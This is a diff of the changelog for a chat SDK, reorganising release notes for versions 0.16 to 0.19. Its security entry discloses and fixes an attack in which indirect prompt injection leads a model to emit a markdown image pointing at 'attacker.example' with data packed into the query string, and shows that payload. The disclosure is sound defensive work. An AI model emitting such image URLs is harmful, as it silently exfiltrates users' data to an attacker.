@@ -2,9 +2,14 @@
 
 ## [Unreleased]
 
+## [0.19.0] - 2026-09-22
+
+First release from the standalone repository, published over npm trusted
+publishing with provenance.
+
 ### Security
 
-- **An image in a model's reply no longer loads itself.** A reply is untrusted — indirect prompt injection arrives through web search, an uploaded document or a tool result — and an image is the sharpest way out of the page, because the model chooses the host *and* the query string. `![](https://attacker.example/x.png?d=…)` fetched the moment the reply rendered, with nobody clicking anything, sending whatever the model packed into that URL. `/ui` has refused images since ADR 0009; the packaged chat, which is the recommended surface, did not. An image is now the link that ADR describes — "Image: alt (host)" — and nothing in a reply fetches on its own. An image whose URL is not http(s) keeps its label and loses its destination.
+- **An image in a model's reply no longer loads itself.** A reply is untrusted — indirect prompt injection arrives through web search, an uploaded document or a tool result — and an image is the sharpest way out of the page, because the model chooses the host *and* the query string. `![](https://attacker.example/x.png?d=…)` fetched the moment the reply rendered, with nobody clicking anything, sending whatever the model packed into that URL. `/ui` had refused images since that rule was written down; the packaged chat, which is the recommended surface, did not. An image is now a link — "Image: alt (host)" — and nothing in a reply fetches on its own. An image whose URL is not http(s) keeps its label and loses its destination.
 - **A withdrawn client tool can no longer run.** `register()` replaced the tool schemas wholesale but only added to the handler and permission maps, so a tool dropped from a later registration stayed executable — and with its schema gone, argument validation waved anything through. Both maps are rebuilt from the tools being registered. The engine validates too, so this was defence in depth rather than a live hole.
 - **An insecure `baseUrl` now says so.** Every request carries the end-user's access token in a header; over plain http that token crosses the network in the clear, and a typo in an environment variable is all it takes. The client warns once at construction, and exempts local addresses, which is how people develop.
 
@@ -16,20 +21,25 @@
 ### Changed
 
 - **An unparseable stream frame is no longer skipped in silence.** It means the reply somebody is reading is missing a piece. The stream still continues, and now says what it dropped.
+- **Vendored assistant-ui files carry their attribution.** `src/chat/vendor/` holds twelve files copied verbatim from assistant-ui (MIT). Each now opens with a provenance header, the licence sits beside them, `MANIFEST.json` records the licence and source per file, and both travel into the published package.
+- **`@assistant-ui/react` is documented as what it is.** It is a dependency of this package, not an optional peer, and the README no longer tells you to install it yourself — which produced a second copy and the "Two copies of @assistant-ui/react are loaded" throw.
+- **The Quick Start no longer teaches `/ui`.** The packaged chat leads; `/ui` is marked deprecated at the entry point and on each of its three components, so an IDE says so at the call site.
+- **The package tells you where to get a key**, and ships the documentation for the component it recommends: `files` now includes `docs`, and the README's links are absolute so they work from npm. (From 0.19.0 the examples live in the public repository rather than the tarball.)
+- **npm metadata**: `bugs` added, `repository` points at the package directory in the correct `git+https` form, `engines` declares the Node floor this ESM-only package needs, `publishConfig.access` is explicit.
+- **The internal release runbook moved to `CONTRIBUTING.md`** — it was in the partner-facing README, and on the npm page.
 
 ### Fixed
 
 - **A mistyped partner key no longer tells the end-user their session expired.** The engine only names a bad key on `POST /v1/auth/anonymous`; every later call has no user token yet, so it answers "Missing authorization token", which the SDK read as an expired session — and said so, to the wrong person. `partner_key_error` now stops the chat where it is raised, with its own message: *This app isn't set up correctly, so chat is unavailable. Please contact support.* No sign-in form, because signing in cannot fix it, and the notice stays up for a signed-in end-user too.
 - **The chat no longer inherits the host page's typography.** Isolation defended against the host's selectors, but an inherited property matches no selector, so alignment, case, tracking, word spacing and indentation simply arrived. The stock Vite React template sets `text-align: center` on `body`, which centred the whole chat; a host with `text-transform: uppercase` rendered the header as "NEW CHAT". The chat's own element now stops all of it. The font is still inherited on purpose. A sixth hostile-host page covers this, since the five existing ones attack with selectors only.
 
-### Changed
+## [0.18.1] - 2026-09-20
 
-- **Vendored assistant-ui files carry their attribution.** `src/chat/vendor/` holds twelve files copied verbatim from assistant-ui (MIT). Each now opens with a provenance header, the licence sits beside them, `MANIFEST.json` records the licence and source per file, and both travel into the published package.
-- **`@assistant-ui/react` is documented as what it is.** It is a dependency of this package, not an optional peer, and the README no longer tells you to install it yourself — which produced a second copy and the "Two copies of @assistant-ui/react are loaded" throw.
-- **The Quick Start no longer teaches `/ui`.** The packaged chat leads; `/ui` is marked deprecated at the entry point and on each of its three components, so an IDE says so at the call site.
-- **The package tells you where to get a key**, and ships the documentation for the component it recommends: `files` now includes `docs` and `examples`, and the README's links are absolute so they work from npm.
-- **npm metadata**: `bugs` added, `repository` points at the package directory in the correct `git+https` form, `engines` declares the Node floor this ESM-only package needs, `publishConfig.access` is explicit.
-- **The internal release runbook moved to `CONTRIBUTING.md`** — it was in the partner-facing README, and on the npm page.
+### Fixed
+
+- **Skills are no longer registered before anyone is signed in.** 0.18.0 sent the session's skills as soon as the chat mounted, which for a logged-out visitor meant a 401 on every page load. Registration now waits for an identity — a guest session counts — and re-sends when one arrives.
+
+## [0.18.0] - 2026-09-20
 
 ### Added
 
@@ -50,13 +60,37 @@ recovery, on a fresh visit — which a host previously had to remember to do.
 Turn the view off with `features={{ skills: false }}`. The `client.skills` API
 is unchanged and still there for hosts that manage skills themselves.
 
+## [0.17.1] - 2026-09-19
+
 ### Fixed
 
 - **A bad or revoked partner key no longer signs the end-user out.** The SDK read every 401 as an expired access token, so it refreshed. The engine's refresh route rejected the same partner key with its own 401, which the SDK took for a dead refresh token, and it cleared the session. Now a `partner_key_error` 401 is thrown as a `PartnerKeyError`, carrying the engine's `type`, `statusCode` and message, with no refresh attempted. This holds for requests, `chat()` and uploads alike, and the stored session is kept. A refresh refused because of the partner key also keeps the session: `t2v.auth.getValidAccessToken()` and the client's `refreshTokens()` throw that `PartnerKeyError` instead of returning `null` / `'invalid'`. Only a rejected refresh token still signs the end-user out, in every tab.
+
+## [0.17.0] - 2026-09-19
+
+### Added
+
+- **The chat's interface primitives work on React 18.** Previously they required React 19, which ruled out the chat for anyone not yet migrated.
+
+### Changed
+
+- **Conversations are kept in the browser, so "New chat" starts one.** The thread list is held client-side, and the button begins a new conversation rather than clearing the current one.
+
+## [0.16.2] - 2026-09-18
+
+### Fixed
+
+- **The chat's New Thread button starts a new conversation** instead of reusing the one already on screen.
+
+## [0.16.1] - 2026-09-18
+
+### Fixed
+
 - **The approval card no longer attributes the tool's own description to the assistant.** That line is `tools.getDescription(name)` — the text an integrator writes for the model — not anything the agent composed. Labelling it "The assistant says:" dressed first-party documentation up as untrusted model output, which is the more misleading direction to get it wrong in.
 - **…and it no longer pushes the decision off the screen.** A tool description is written for a model, so it can run to a paragraph: in a 320px task pane an unclamped one put the destructive-tool warning and the allow/deny buttons below the fold. It is clamped to three lines now, with the full text kept in the DOM for a screen reader and in `title` for a pointer.
 - **A thread's "More options" menu is styled again.** Radix portals it to `<body>`, outside the chat's scoped stylesheet, so without a container it rendered with no background, border or padding. It now portals into the chat's own portal host, like every other popup.
 
+## [0.16.0] - 2026-09-18
 
 ### Added
 
@@ -121,7 +155,7 @@ Tailwind in the host, in [`examples/react-chat`](examples/react-chat).
 
 ### Security
 
-- **Model replies render as markdown only** (`docs/adr/0009-model-replies-render-as-markdown-only.md`). `<ChatPanel>` and the new `renderSafeMarkdown()` export from `@talk2view/sdk/ui` now:
+- **Model replies render as markdown only.** `<ChatPanel>` and the new `renderSafeMarkdown()` export from `@talk2view/sdk/ui` now:
   - show raw HTML in a reply as text (a bare `<br>` still breaks lines inside table cells);
   - turn images into links the end-user opens themselves, so nothing loads when the reply appears;
   - open web links in a new tab with `noopener noreferrer`;
